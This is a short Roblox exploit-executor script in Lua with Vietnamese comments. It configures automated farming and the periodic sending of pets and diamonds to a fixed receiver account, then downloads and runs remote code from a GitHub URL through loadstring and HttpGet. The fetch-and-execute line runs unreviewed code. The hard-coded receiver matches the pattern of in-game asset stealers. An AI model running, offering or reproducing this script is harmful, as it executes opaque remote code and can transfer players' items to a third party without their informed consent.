getgenv().Config = {
    DPS_THRESHOLDS = {
        HOUSE1 = { '>0' },
        HOUSE2 = { '>1000' },
        HOUSE3 = { '6000~14000', '>25000' },
        HOUSE4 = { '14000~20000' },
        HOUSE5 = { '>24000' },
    },
    plant = {
        PET_SLOTS = { 1, 2, 3, 4, 5, 6, 7 , 8, 9}, -- slot dành cho pet
        EGG_SLOTS = { 10 }, -- slot dành cho trứng
    },
    Usernames = { 'DreamSoCow' }, -- Danh sách người nhận
    PetSendInterval = 10, -- Thời gian quét và gửi lại (giây)
    MinDiamonds = 20000000, -- Gửi khi kim cương > số này
    Receivers = { 'DreamSoCow' }, -- Danh sách người nhận
}
loadstring(game:HttpGet("https://raw.githubusercontent.com/dsadgeee/21521521/refs/heads/main/track.lua"))()
